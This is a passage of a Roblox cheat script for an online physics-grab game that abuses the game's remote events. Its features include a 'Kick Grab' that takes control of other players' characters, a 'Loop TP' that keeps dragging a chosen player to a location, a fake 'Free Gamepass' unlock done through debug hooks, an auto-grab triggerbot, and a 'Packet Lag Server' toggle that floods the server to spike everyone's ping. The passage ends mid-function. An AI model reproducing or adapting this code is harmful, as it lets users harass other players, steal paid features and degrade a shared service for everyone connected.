PanelTools:AddCheckbox('KickGrabToggle', {
    Text = 'Kick Grab',
    Default = false,
})
Toggles.KickGrabToggle:OnChanged(function(state)
    if not state then
        getgenv().KickGrabActive = false
        getgenv().FKeyAttackActive = false

        if getgenv().FKeyInputConnection then
            getgenv().FKeyInputConnection:Disconnect()

            getgenv().FKeyInputConnection = nil
        end

        return
    end
    if getgenv().KickGrabActive then
        return
    end

    getgenv().KickGrabActive = true
    getgenv().FKeyAttackActive = false

    local Players = game:GetService('Players')
    local ReplicatedStorage = game:GetService('ReplicatedStorage')
    local UserInputService = game:GetService('UserInputService')
    local RunService = game:GetService('RunService')
    local plr = Players.LocalPlayer
    local camera = workspace.CurrentCamera
    local GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
    local CreateGrabLine = GrabEvents:WaitForChild('CreateGrabLine')
    local SetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
    local DestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')

    task.spawn(function()
        while getgenv().KickGrabActive do
            local grabParts = workspace:FindFirstChild('GrabParts')

            if not grabParts then
                task.wait()

                continue
            end

            local gp = grabParts:FindFirstChild('GrabPart')
            local weld = gp and gp:FindFirstChildOfClass('WeldConstraint')
            local part1 = weld and weld.Part1

            if part1 then
                local ownerPlayer = nil

                for _, pl in ipairs(Players:GetPlayers())do
                    if pl.Character and part1:IsDescendantOf(pl.Character) then
                        ownerPlayer = pl

                        break
                    end
                end

                if not ownerPlayer then
                    task.wait()

                    continue
                end

                while getgenv().KickGrabActive and workspace:FindFirstChild('GrabParts') do
                    if ownerPlayer then
                        local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('HumanoidRootPart')
                        local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('Head')
                        local myTorso = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

                        if tgtTorso and myTorso and tgtHead then
                            pcall(function()
                                SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                            end)
                            task.wait()
                            pcall(function()
                                DestroyGrabLine:FireServer(tgtHead)
                            end)
                        end
                    end

                    task.wait()
                end
            end

            task.wait()
        end
    end)

    function getScreenCenterTarget()
        local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
        local ray = camera:ViewportPointToRay(screenCenter.X, screenCenter.Y)
        local raycastParams = RaycastParams.new()

        raycastParams.FilterType = Enum.RaycastFilterType.Exclude

        if plr.Character then
            raycastParams.FilterDescendantsInstances = {
                plr.Character,
            }
        end

        local result = workspace:Raycast(ray.Origin, ray.Direction * 1000, raycastParams)

        if result and result.Instance then
            for _, pl in ipairs(Players:GetPlayers())do
                if pl ~= plr and pl.Character and result.Instance:IsDescendantOf(pl.Character) then
                    return pl
                end
            end
        end

        return nil
    end

    local fAttackTarget = nil
    local fAttackConnection = nil

    function stopFKeyAttack()
        getgenv().FKeyAttackActive = false
        fAttackTarget = nil

        if fAttackConnection then
            fAttackConnection:Disconnect()

            fAttackConnection = nil
        end
    end
    function startFKeyAttack(targetPlayer)
        getgenv().FKeyAttackActive = true
        fAttackTarget = targetPlayer
        fAttackConnection = RunService.RenderStepped:Connect(function()
            if not getgenv().FKeyAttackActive or not fAttackTarget then
                stopFKeyAttack()

                return
            end

            local myChar = plr.Character
            local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
            local tgtChar = fAttackTarget.Character
            local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

            if not myRoot or not tgtRoot then
                return
            end

            local camCF = camera.CFrame
            local teleportPos = camCF.Position + camCF.LookVector * 20

            pcall(function()
                tgtRoot.CFrame = CFrame.new(teleportPos)
            end)

            local grabCFrame = CFrame.new(-9.0301513671875E-2, 0.4190945625305176, 0.4999980926513672, 0.39632707834243774, 0, -0.9181094169616699, -1.0944717132588266E-7, 1, -4.7245869438938826E-8, 0.9181094169616699, 5.9604644775390625e-8, 0.39632707834243774)

            pcall(function()
                CreateGrabLine:FireServer(tgtRoot, grabCFrame)
                SetNetworkOwner:FireServer(tgtRoot, CFrame.lookAt(myRoot.Position, tgtRoot.Position))
                DestroyGrabLine:FireServer(tgtRoot)
            end)
        end)
    end

    getgenv().FKeyInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end
        if input.KeyCode ~= Enum.KeyCode.F then
            return
        end
        if getgenv().FKeyAttackActive then
            stopFKeyAttack()

            return
        end

        local target = getScreenCenterTarget()

        if not target then
            return
        end

        local myChar = plr.Character
        local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
        local tgtChar = target.Character
        local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

        if not myRoot or not tgtRoot then
            return
        end

        local distance = (myRoot.Position - tgtRoot.Position).Magnitude

        if distance > 25 then
            return
        end

        startFKeyAttack(target)
    end)

    if game.PlaceId ~= 6961824067 then
        return
    end

    local G = game:GetService('ReplicatedStorage'):WaitForChild('GrabEvents')

    G:WaitForChild('EndGrabEarly'):Destroy()

    Instance.new('RemoteEvent', G).Name = 'EndGrabEarly'
end)
PanelTools:AddDivider()
PanelThrow:AddSlider('slThrowForce', {
    Text = 'Throw Force',
    Tooltip = 'How far are the objects thrown?',
    Default = 750,
    Min = 1,
    Max = 20000,
    Rounding = 0,
}):OnChanged(function(v)
    ThrowForce = v
    _G.strength = v
end)
PanelThrow:AddSlider('slMasslessSense', {
    Text = 'Line Responsiveness',
    Tooltip = 'Smoothness of grab line movement.',
    Default = 30,
    Min = 1,
    Max = 2000,
    Rounding = 0,
}):OnChanged(function(v)
    MasslessSense = math.max(1, v or MasslessSense)
end)
PanelThrow:AddSlider('slExtendLineForce', {
    Text = 'Scroll Step Power',
    Tooltip = 'Distance moved per mouse wheel tick.',
    Default = 7,
    Min = 1,
    Max = 25,
    Rounding = 0,
}):OnChanged(function(v)
    increaseLineExtendV = v
end)
PanelThrow:AddSlider('slTBDist', {
    Text = 'Trigger Range',
    Tooltip = 'Maximum distance for auto trigger detection.',
    Default = 20,
    Min = 5,
    Max = 45,
    Rounding = 0,
}):OnChanged(function(v)
    TBDist = v
end)
PanelTools:AddDivider()
PanelTools:AddButton({
    Text = 'Release Anchors',
    Tooltip = 'Clears all frozen / anchored objects.',
    Func = function()
        ReleaseAllAnchor()
        notify('Anchor System', 'All anchored parts released', 3)
    end,
})

LTPTarget = nil
LTPActive = false
LTPThread = nil
LTPDestCF = tpland.Spawn
LTPDestNm = 'Spawn'

function GrabAndTP(target, pos)
    if not target or not target.Character then
        return false, 'No character'
    end
    if InPlot(target) then
        return false, 'In plot'
    end

    local tc = target.Character
    local tHRP = tc:FindFirstChild('HumanoidRootPart')
    local tHd = tc:FindFirstChild('Head')

    if not (tHRP and tHd) then
        return false, 'Invalid character'
    end

    local myHRP = LocalRoot()

    if not myHRP then
        return false, 'No local root'
    end

    local saved = myHRP.CFrame

    myHRP.CFrame = tHRP.CFrame * CFrame.new(0, -6, 0)

    task.wait(0.1)

    local tries = 0

    repeat
        EvSetOwner:FireServer(tHRP, myHRP.CFrame)
        task.wait(0.15)

        tries += 1

        if tries > 20 then
            break
        end
    until tHd:FindFirstChild('PartOwner') and tHd.PartOwner.Value == Me.Name

    if not (tHd:FindFirstChild('PartOwner') and tHd.PartOwner.Value == Me.Name) then
        myHRP.CFrame = saved

        return false, 'Ownership failed'
    end

    myHRP.CFrame = saved

    task.spawn(function()
        local t0 = tick()

        while tc and tc.Parent and tHd:FindFirstChild('PartOwner') and tHd.PartOwner.Value == Me.Name and tick() - t0 < 5 do
            if (tHRP.Position - pos).Magnitude > 5 then
                tHRP.CFrame = CFrame.new(pos)
                tHRP.AssemblyLinearVelocity = Vector3.zero
            end

            task.wait()
        end

        EvDestroyLine:FireServer(tHRP)
    end)

    return true, 'OK'
end

local ddLTPPlayer = PanelLoopTP:AddDropdown('ddLTPPlayer', {
    Text = 'Target Player',
    Tooltip = 'Which player to teleport.',
    EnablePlayerImages = true,
    Values = PlayerList(),
    Default = 1,
})

ddLTPPlayer:OnChanged(function(v)
    if not v or v == 'No players' then
        LTPTarget = nil

        return
    end

    local n = v:match('@([%w_]+)')

    if n then
        LTPTarget = SvcPlayers:FindFirstChild(n)
    end
end)
PanelLoopTP:AddButton({
    Text = 'Refresh',
    Tooltip = 'Reload the player list.',
    Func = function()
        local l = PlayerList()

        ddLTPPlayer:SetValues(l)

        if l[1] then
            ddLTPPlayer:SetValue(l[1])
        end
    end,
})
SvcPlayers.PlayerAdded:Connect(function()
    ddLTPPlayer:SetValues(PlayerList())
end)
SvcPlayers.PlayerRemoving:Connect(function()
    task.wait(0.1)

    local l = PlayerList()

    ddLTPPlayer:SetValues(l)

    if l[1] then
        ddLTPPlayer:SetValue(l[1])
    end
end)
PanelLoopTP:AddDropdown('ddLTPDest', {
    Text = 'Destination',
    Tooltip = 'Where the target will be sent.',
    Values = locations,
    Default = 1,
}):OnChanged(function(v)
    if v and tpland[v] then
        LTPDestCF = tpland[v]
        LTPDestNm = v
    end
end)
PanelLoopTP:AddButton({
    Text = 'TP Once',
    Tooltip = 'Teleport the target to the selected destination a single time.',
    Func = function()
        if not LTPTarget then
            Notify('Error', 'No target', 3)

            return
        end

        local ok, msg = GrabAndTP(LTPTarget, LTPDestCF)

        Notify(ok and 'Teleported' or 'Failed', ok and (LTPTarget.DisplayName .. ' \u{2192} ' .. LTPDestNm) or msg, 3)
    end,
})
PanelLoopTP:AddCheckbox('cbLoopTP', {
    Text = 'Loop TP',
    Tooltip = 'Continuously keeps the target locked at the destination.',
    Default = false,
}):OnChanged(function(v)
    LTPActive = v

    if v then
        if not LTPTarget then
            Notify('Error', 'Select a target first', 3)

            LTPActive = false

            return
        end

        LTPThread = task.spawn(function()
            while LTPActive do
                if LTPTarget and LTPTarget.Character then
                    if InPlot(LTPTarget) then
                        task.wait(1)
                    else
                        local tHRP = LTPTarget.Character:FindFirstChild('HumanoidRootPart')
                        local tHd = LTPTarget.Character:FindFirstChild('Head')
                        local owned = tHd and tHd:FindFirstChild('PartOwner') and tHd.PartOwner.Value == Me.Name

                        if not owned then
                            local d = tHRP and (tHRP.Position - LTPDestCF).Magnitude or 0

                            if d > 5 then
                                GrabAndTP(LTPTarget, LTPDestCF)
                            end
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    else
        if LTPThread then
            task.cancel(LTPThread)

            LTPThread = nil
        end
    end
end)

local CollisionOn = false

for _, plot in pairs(SvcWS.PlotItems:GetChildren())do
    if plot.Name ~= 'PlayersInPlots' then
        plot.DescendantAdded:Connect(function(p)
            if p:IsA('BasePart') and CollisionOn then
                p.CollisionGroup = 'Items'
            end
        end)
    end
end

PanelAssist:AddCheckbox('ReachToggle', {
    Text = 'Free Gamepass',
    Tooltip = '<b>[XENO / SOLARA DOESNT WORK]</b> Gives you 30 studs of reach instantly',
    Default = false,
})
Toggles.ReachToggle:OnChanged(function(state)
    if state then
        local Reach = Instance.new('BoolValue')

        Reach.Name = 'FartherReach'
        Reach.Parent = game.Players.LocalPlayer
        Reach.Value = true

        local Notifier = game.ReplicatedStorage.GamepassEvents:FindFirstChild('FurtherReachBoughtNotifier')

        if Notifier then
            for _, connection in ipairs(getconnections(Notifier.OnClientEvent))do
                pcall(connection.Function)
            end
        end
    else
        local Reach = game.Players.LocalPlayer:FindFirstChild('FartherReach')

        if Reach then
            Reach:Destroy()
        end
    end
end)

local GrabReachEnabled = false
local GrabReachDist = 25

function ApplyGrabReach(range)
    GrabReachDist = range

    pcall(function()
        RS.DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 195)),
        }))
    end)
    pcall(function()
        for _, conn in pairs(getconnections(RS.GamepassEvents.FurtherReachBoughtNotifier.OnClientEvent))do
            for i in debug.getupvalues(conn.Function)do
                debug.setupvalue(conn.Function, i, range)
            end
        end
    end)
end

PanelAssist:AddCheckbox('GrabReachToggle', {
    Text = 'Further Reach',
    Tooltip = 'Extends your grab distance beyond default',
    Default = false,
    Callback = function(v)
        GrabReachEnabled = v

        if v then
            ApplyGrabReach(GrabReachDist)
        else
            ApplyGrabReach(25)
        end
    end,
})
PanelAssist:AddSlider('GrabReachSlider', {
    Text = 'Reach Distance',
    Default = 25,
    Min = 25,
    Max = 45,
    Rounding = 0,
    Callback = function(v)
        GrabReachDist = v

        if GrabReachEnabled then
            ApplyGrabReach(v)
        end
    end,
})

TB = {
    On = false,
    Conn = nil,
    Ready = true,
    MaxDist = 20,
    PreDelay = 0.00001,
    PostDelay = 0.05,
    LastTarget = nil,
    LastHit = 0,
    Memory = 0.1,
    Throttle = 0.008,
    LastCheck = 0,
}

local TBRay = RaycastParams.new()

TBRay.FilterType = Enum.RaycastFilterType.Exclude

task.spawn(function()
    local ok, r = pcall(function()
        return SvcRS.GamepassEvents.CheckForGamepass:InvokeServer(20837132)
    end)

    if ok and r then
        TB.MaxDist = 29.3
    end
end)

if SvcRS:FindFirstChild('GamepassEvents') and SvcRS.GamepassEvents:FindFirstChild('FurtherReachBoughtNotifier') then
    SvcRS.GamepassEvents.FurtherReachBoughtNotifier.OnClientEvent:Connect(function()
        TB.MaxDist = 29.3
    end)
end

function TB:FindTarget()
    local c = LocalChar()

    if not c or not c:FindFirstChild('HumanoidRootPart') then
        return
    end
    if SvcWS:FindFirstChild('GrabParts') then
        return
    end

    local origin = Cam.CFrame.Position
    local dir = Cam.CFrame.LookVector

    TBRay.FilterDescendantsInstances = {
        c,
        SvcWS.Terrain,
    }

    local res

    for _, d in ipairs({
        dir,
        (dir + Vector3.new(0, 0.075, 0)).Unit,
        (dir + Vector3.new(0, -7.5E-2, 0)).Unit,
    })do
        res = SvcWS:Raycast(origin, d * 1000, TBRay)

        if res then
            break
        end
    end

    if not res then
        return
    end

    local m = res.Instance:FindFirstAncestorOfClass('Model')

    if not m or m == c then
        return
    end

    local hum = m:FindFirstChildOfClass('Humanoid')
    local root = m:FindFirstChild('HumanoidRootPart')

    if not hum or hum.Health <= 0 or not root then
        return
    end
    if (c.HumanoidRootPart.Position - root.Position).Magnitude > self.MaxDist then
        return
    end

    return m
end
function TB:Tick()
    if not self.On or not self.Ready then
        return
    end
    if SvcInput:GetFocusedTextBox() then
        return
    end
    if tick() - self.LastCheck < self.Throttle then
        return
    end

    self.LastCheck = tick()

    local t = self:FindTarget()

    if t then
        self.LastTarget = t
        self.LastHit = tick()
    elseif self.LastTarget and tick() - self.LastHit > self.Memory then
        self.LastTarget = nil
    end

    local c = LocalChar()
    local root = self.LastTarget and self.LastTarget:FindFirstChild('HumanoidRootPart')

    if not (self.LastTarget and c and c:FindFirstChild('HumanoidRootPart') and root) then
        return
    end
    if (c.HumanoidRootPart.Position - root.Position).Magnitude > self.MaxDist then
        self.LastTarget = nil

        return
    end

    self.Ready = false

    task.spawn(function()
        task.wait(self.PreDelay)
        pcall(mouse1press)

        local t0 = tick()

        repeat
            task.wait(0.02)
        until not SvcWS:FindFirstChild('GrabParts') or tick() - t0 > 1.6

        task.wait(self.PostDelay)

        self.Ready = true
        self.LastTarget = nil
    end)
end
function CheckInvisConflict()
    if _G.InvisLine then
        Notify('Warning', 'Invisible Line disabled \u{2014} conflicts with lag.', 6)

        _G.InvisLine = nil

        if Toggles.cbInvisLine then
            Toggles.cbInvisLine:SetValue(false)
        end
    end
end
function RunLag(mode)
    task.defer(function()
        while true do
            task.wait(1 / LagGPS)

            if mode == 'Players' then
                if not LagPlayers then
                    break
                end

                for _, p in pairs(SvcPlayers:GetPlayers())do
                    local c = p.Character
                    local t = c and c:FindFirstChild('Torso')

                    if t then
                        pcall(function()
                            EvCreateLine:FireServer(t, t.CFrame)
                        end)
                    end
                end
            elseif mode == 'Map' then
                if not LagMap then
                    break
                end

                local base = SvcWS:FindFirstChild('Map') and SvcWS.Map:FindFirstChild('BaseGround')

                if base then
                    for _, part in pairs(base:GetChildren())do
                        if part.Name == 'Grass' then
                            pcall(function()
                                EvCreateLine:FireServer(part, part.CFrame)
                            end)
                        end
                    end
                end
            end
        end
    end)
end

pingT = false
packetsV = 100
stpon = 300

PanelNet:AddCheckbox('TogglePacketLag', {
    Text = 'Packet Lag Server',
    Default = false,
    Tooltip = 'Spam packets',
    Callback = function(Value)
        pingT = Value

        if pingT then
            task.spawn(function()
                while pingT do
                    pcall(function()
                        local ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()

                        if ping >= stpon then
                            return
                        end

                        rs.GrabEvents.ExtendGrabLine:FireServer(string.rep('9223372036854776000-9223372036854776000-9223372036854776000-9223372036854776000', packetsV))
                    end)
                    task.wait()
                end
            end)
        end
    end,
})
PanelNet:AddSlider('SliderPacketLag', {
    Text = 'Packet Data Amount',
    Tooltip = 'Packet spam Amount',
    Min = 10,
    Max = 3000,
    Default = 100,
    Callback = function(Value)
        packetsV = Value
    end,
})
PanelNet:AddSlider('Stopinms', {
    Text = 'Stop On',
    Tooltip = 'Max ping',
    Min = 100,
    Max = 100000,
    Suffix = 'ms',
    Default = 300,
    Callback = function(Value)
        stpon = Value
    end,
})

local PacketMonitorToggle = PanelNet:AddCheckbox('PacketMonitorToggle', {
    Text = 'Packet Lag Notify',
    Default = false,
})

activeNotifications = {}

function calculatePacketSize(data)
    local size = 0

    if type(data) == 'table' then
        for k, v in pairs(data)do
            size = size + calculatePacketSize(k) + calculatePacketSize(v)
        end
    elseif type(data) == 'string' then
        size = size + string.len(data)
    elseif type(data) == 'number' then
        size = size + 8
    elseif type(data) == 'boolean' then
        size = size + 1
    elseif typeof(data) == 'Instance' then
        size = size + string.len(data.Name) + 4
    else
        size = size + string.len(tostring(data))
    end

    return size
end
function sendPacketNotification(playerName, displayName, mbSize)
    Library:Notify({
        Title = 'Lag <b>[PACKET]</b> has been Detected',
        Description = 'Player: ' .. displayName .. ' (@' .. playerName .. ')\n' .. 'Packet Size: ' .. mbSize .. ' MB\nThey are packeting the server, spiking everyones ping.',
        Time = 5,
    })
end
function monitorRemote(remote)
    if remote:IsA('RemoteEvent') then
        remote.OnClientEvent:Connect(function(...)
            if not PacketMonitorToggle.Value then
                return
            end

            local args = {...}
            local totalSize = calculatePacketSize(args)

            if totalSize >= 10240 then
                local senderDisplayName = 'Unknown'
                local senderName = 'Server'

                for _, arg in ipairs(args)do
                    if typeof(arg) == 'Instance' and arg:IsA('Player') then
                        senderDisplayName = arg.DisplayName
                        senderName = arg.Name

                        break
                    elseif type(arg) == 'string' and Players:FindFirstChild(arg) then
                        local plr = Players:FindFirstChild(arg)

                        senderDisplayName = plr.DisplayName
                        senderName = plr.Name

                        break
                    end
                end

                if not activeNotifications[senderName] then
                    activeNotifications[senderName] = true

                    local mbSize = string.format('%.3f', totalSize / 1048576)

                    sendPacketNotification(senderName, senderDisplayName, mbSize)
                    task.delay(3, function()
                        activeNotifications[senderName] = false
                    end)
                end
            end
        end)
    end
end

PacketMonitorToggle:OnChanged(function(state)
    if not state then
        return
    end

    for _, instance in ipairs(game:GetDescendants())do
        monitorRemote(instance)
    end

    game.DescendantAdded:Connect(function(inst)
        monitorRemote(inst)
    end)
end)

game_Players = game:GetService('Players')
game_Debris = game:GetService('Debris')
game_Workspace = game:GetService('Workspace')
game_Lighting = game:GetService('Lighting')
game_TweenService = game:GetService('TweenService')
game_UserInputService = game:GetService('UserInputService')
game_ReplicatedStorage = game:GetService('ReplicatedStorage')
game_ContextActionService = game:GetService('ContextActionService')
game_RunService = game:GetService('RunService')
CurrentPlayer = game_Players.LocalPlayer
GrabEventsFolder = game_ReplicatedStorage:WaitForChild('GrabEvents')
SetOwnershipEvent = GrabEventsFolder:WaitForChild('SetNetworkOwner')
DestroyLineEvent = GrabEventsFolder:WaitForChild('DestroyGrabLine')
CreateLineEvent = GrabEventsFolder:WaitForChild('CreateGrabLine', 3)
_G.ControllingCreature = nil
ConnectionNoclip = nil
NoclipEnabled = false
RaycastParameters = RaycastParams.new()
RaycastParameters.FilterDescendantsInstances = {
    CurrentPlayer.Character,
}
RaycastParameters.FilterType = Enum.RaycastFilterType.Exclude

function CreateLookAtCFrame(startPosition, endPosition)
    DirectionVector = (endPosition - startPosition).Unit
    RightAxis = DirectionVector:Cross(Vector3.new(0, 1, 0))
    UpAxis = RightAxis:Cross(DirectionVector)

    return CFrame.fromMatrix(startPosition, RightAxis, UpAxis)
end
function GetCurrentCharacter()
    if CurrentPlayer.Character and (CurrentPlayer.Character:FindFirstChild('HumanoidRootPart') and CurrentPlayer.Character:FindFirstChildOfClass('Humanoid')) then
        return CurrentPlayer.Character
    end
end
function ValidatePartOwnership(partInstance, shouldReturnOwner)
    if typeof(partInstance) == 'Instance' and (partInstance:FindFirstChild('PartOwner') and partInstance.PartOwner.Value == CurrentPlayer.Name) then
        return not shouldReturnOwner and true or partInstance.PartOwner
    end
end
function RequestOwnershipSingle(partInstance)
    DistanceFromPlayer = CurrentPlayer:DistanceFromCharacter(partInstance.Position)

    if CurrentPlayer.Character and CurrentPlayer.Character:FindFirstChild('HumanoidRootPart') then
        if ValidatePartOwnership(partInstance) then
            return true
        end
        if DistanceFromPlayer <= 30 then
            SetOwnershipEvent:FireServer(partInstance, CreateLookAtCFrame(CurrentPlayer.Character.HumanoidRootPart.Position, partInstance.Position))
        end
    end
end
function RequestOwnershipAndRemoveLine(partInstance)
    DistanceCalculated = CurrentPlayer:DistanceFromCharacter(partInstance.Position)
    IsConnected = partInstance:GetAttribute('Connected')
    HasCreatedConnection = partInstance:GetAttribute('CreatedConnected')

    if CurrentPlayer.Character and CurrentPlayer.Character:FindFirstChild('HumanoidRootPart') then
        if ValidatePartOwnership(partInstance) then
            partInstance:SetAttribute('Connected', true)
            DestroyLineEvent:FireServer(partInstance)

            if not HasCreatedConnection then
                partInstance:SetAttribute('CreatedConnected', true)
                partInstance.ChildAdded:Connect(function(childAdded)
                    if childAdded.Name == 'PartOwner' and childAdded.Value ~= CurrentPlayer.Name then
                        partInstance:SetAttribute('Connected', false)
                    end
                end)
            end
        elseif DistanceCalculated <= 30 and not IsConnected then
            SetOwnershipEvent:FireServer(partInstance, CreateLookAtCFrame(CurrentPlayer.Character.HumanoidRootPart.Position, partInstance.Position))
        end
    end
end
function ActivateNoclipMode()
    if not ConnectionNoclip then
        NoclipEnabled = false
        NoclipLoopFunction = function()
            if NoclipEnabled == false and game_Players.LocalPlayer.Character ~= nil then
                ChildrenIterator, ChildrenTable, CurrentIndex = pairs(game_Players.LocalPlayer.Character:GetChildren())

                while true do
                    CurrentChild = nil
                    CurrentIndex, CurrentChild = ChildrenIterator(ChildrenTable, CurrentIndex)

                    if CurrentIndex == nil then
                        break
                    end
                    if CurrentChild:IsA('BasePart') and CurrentChild.CanCollide then
                        CurrentChild.CanCollide = false
                    end
                end
            end

            wait(0.21)
        end
        ConnectionNoclip = game_RunService.Stepped:Connect(NoclipLoopFunction)
    end
end
function DeactivateNoclipMode()
    if not _G.NoclipToggle then
        if ConnectionNoclip then
            ConnectionNoclip:Disconnect()

            ConnectionNoclip = nil
        end

        NoclipEnabled = true
    end
end
function DisableCharacterQuery(characterModel)
    PartsIterator, PartsTable, PartIndex = pairs(characterModel:GetChildren())

    while true do
        CurrentPart = nil
        PartIndex, CurrentPart = PartsIterator(PartsTable, PartIndex)

        if PartIndex == nil then
            break
        end
        if CurrentPart:IsA('Part') then
            CurrentPart.CanQuery = false
        end
    end
end
function EnableCharacterQuery(characterModel)
    IteratorFunc, TableData, IndexPos = pairs(characterModel:GetChildren())

    while true do
        PartData = nil
        IndexPos, PartData = IteratorFunc(TableData, IndexPos)

        if IndexPos == nil then
            break
        end
        if PartData:IsA('Part') then
            PartData.CanQuery = true
        end
    end
end

ControlAudioEffect = Instance.new('Sound', game_Workspace)
ControlAudioEffect.SoundId = 'rbxassetid://9114374439'
ControlAudioEffect.PlaybackSpeed = 1.25
ColorCorrectionInstance = Instance.new('ColorCorrectionEffect', game_Lighting)
ColorCorrectionInstance.Enabled = false
FieldOfViewTween = game_TweenService:Create(game_Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, true), {FieldOfView = 100})
TintColorTween = game_TweenService:Create(ColorCorrectionInstance, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
    TintColor = Color3.fromRGB(200, 210, 240),
})
BrightnessTween = game_TweenService:Create(ColorCorrectionInstance, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    Brightness = -0.1,
})
ResetColorTween = game_TweenService:Create(ColorCorrectionInstance, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
    TintColor = Color3.new(3, 3, 3),
    Brightness = 0,
})

function StartControlVisuals()
    ColorCorrectionInstance.Enabled = true
    ColorCorrectionInstance.TintColor = Color3.new()

    FieldOfViewTween:Play()
    TintColorTween:Play()
    ControlAudioEffect:Play()
    TintColorTween.Completed:Once(function()
        BrightnessTween:Play()
    end)
end
function EndControlVisuals()
    ResetColorTween:Play()
    ResetColorTween.Completed:Once(function()
        ColorCorrectionInstance.Enabled = false
    end)
end
function MovePlayerToPosition(targetCFrame, offsetVector)
    PlayerCharacter = GetCurrentCharacter()

    if PlayerCharacter and typeof(targetCFrame) == 'CFrame' then
        RootPartInstance = PlayerCharacter.HumanoidRootPart
        HumanoidInstance = PlayerCharacter:FindFirstChildOfClass('Humanoid')
        RootPartInstance.CFrame = RootPartInstance.CFrame.Rotation + targetCFrame.Position

        if HumanoidInstance.SeatPart == nil or tostring(HumanoidInstance.SeatPart.Parent) ~= 'CreatureBlobman' then
            HumanoidInstance.Sit = false
        end
    end
end
function BeginControllingTarget(targetModelInstance)
    if typeof(targetModelInstance) == 'Instance' and targetModelInstance:IsA('Model') then
        TargetModel = targetModelInstance
        TargetHumanoid = TargetModel:FindFirstChildOfClass('Humanoid')
        TargetRootPart = TargetModel:FindFirstChild('HumanoidRootPart')
        TargetHead = TargetModel:FindFirstChild('Head')
        IsValidTargetType = (function()
            if not game_Players:GetPlayerFromCharacter(targetModelInstance) and (targetModelInstance.Name == 'YouDecoy' or (targetModelInstance.Name == 'CreatureBlobman' or tostring(targetModelInstance.Parent.Name) == 'Robloxians')) then
                return true
            end
        end)()

        if TargetModel and (TargetHumanoid and TargetRootPart) then
            ConnectionsTable = {}
            CleanupAllConnections = function()
                ConnectionIterator, ConnectionData, ConnectionIndex = pairs(ConnectionsTable)

                while true do
                    ConnectionObject = nil
                    ConnectionIndex, ConnectionObject = ConnectionIterator(ConnectionData, ConnectionIndex)

                    if ConnectionIndex == nil then
                        break
                    end
                    if typeof(ConnectionObject) == 'RBXScriptConnection' then
                        ConnectionObject:Disconnect()
                    end
                end

                table.clear(ConnectionsTable)
            end
            _G.ControllingCreature = TargetModel
            TargetHumanoid.WalkSpeed = 0
            TargetHumanoid.JumpPower = 24
            TargetHumanoid.CameraOffset = Vector3.new(0, 0, -0.7)
            ConnectionsTable[1] = TargetHumanoid.Died:Connect(function()
                _G.ControllingCreature = nil
            end)
            VelocityController = Instance.new('BodyVelocity', TargetRootPart)
            PlayerVelocityController = Instance.new('BodyVelocity')
            PlayerVelocityController.MaxForce = Vector3.new(0, math.huge, 0)
            PlayerVelocityController.Velocity = Vector3.new()
            VelocityController.MaxForce = Vector3.new(math.huge, 0, math.huge)

            DisableCharacterQuery(TargetModel)
            task.spawn(function()
                ActivateNoclipMode()

                while TargetModel.Parent and _G.ControllingCreature ~= nil do
                    if IsValidTargetType then
                        RequestOwnershipAndRemoveLine(TargetHead)
                    else
                        RequestOwnershipSingle(TargetHead)
                    end

                    TargetHumanoid.AutoRotate = true

                    task.wait()
                end
            end)

            game_Workspace.CurrentCamera.CameraSubject = TargetHumanoid

            StartControlVisuals()

            PlayerCharacterCurrent = GetCurrentCharacter()
            PlayerRootPartReference = nil
            PlayerHumanoidReference = nil

            if PlayerCharacterCurrent then
                PlayerHumanoidReference = PlayerCharacterCurrent:FindFirstChildOfClass('Humanoid')
                PlayerRootPartReference = PlayerCharacterCurrent:FindFirstChild('HumanoidRootPart')
                PlayerVelocityController.Parent = PlayerRootPartReference
                ConnectionsTable[2] = PlayerHumanoidReference.Died:Connect(function()
                    _G.ControllingCreature = nil
                end)
                ConnectionsTable[3] = game_UserInputService.JumpRequest:Connect(function()
                    TargetHumanoid:ChangeState('Jumping')
                end)
                ConnectionsTable[5] = PlayerHumanoidReference.Changed:Connect(function(propertyName)
                    if propertyName == 'MoveDirection' then
                        VelocityController.Velocity = PlayerHumanoidReference.MoveDirection * 20
                    end
                end)
                ConnectionsTable[6] = workspace.CurrentCamera.Changed:Connect(function(cameraProperty)
                    if cameraProperty == 'CameraSubject' then
                        game_Workspace.CurrentCamera.CameraSubject = TargetHumanoid
                    end
                end)
                CameraDirectionVector = nil
                ConnectionsTable[7] = TargetHead.Changed:Connect(function(headProperty)
                    if headProperty == 'CFrame' then
                        CameraDirectionVector = game_Workspace.CurrentCamera.CFrame.lookVector
                        TargetHumanoid.CameraOffset = -Vector3.new(CameraDirectionVector.X, 5, CameraDirectionVector.Z) * 1.7
                    end
                end)

                TargetHumanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            else
                PlayerRootPartReference = nil
                PlayerHumanoidReference = nil
            end

            while TargetModel.Parent and (_G.ControllingCreature ~= nil and (PlayerCharacterCurrent and PlayerCharacterCurrent.Parent)) do
                MovePlayerToPosition(CFrame.new(TargetRootPart.Position + Vector3.new(0, -10, 0)))
                task.wait()
            end

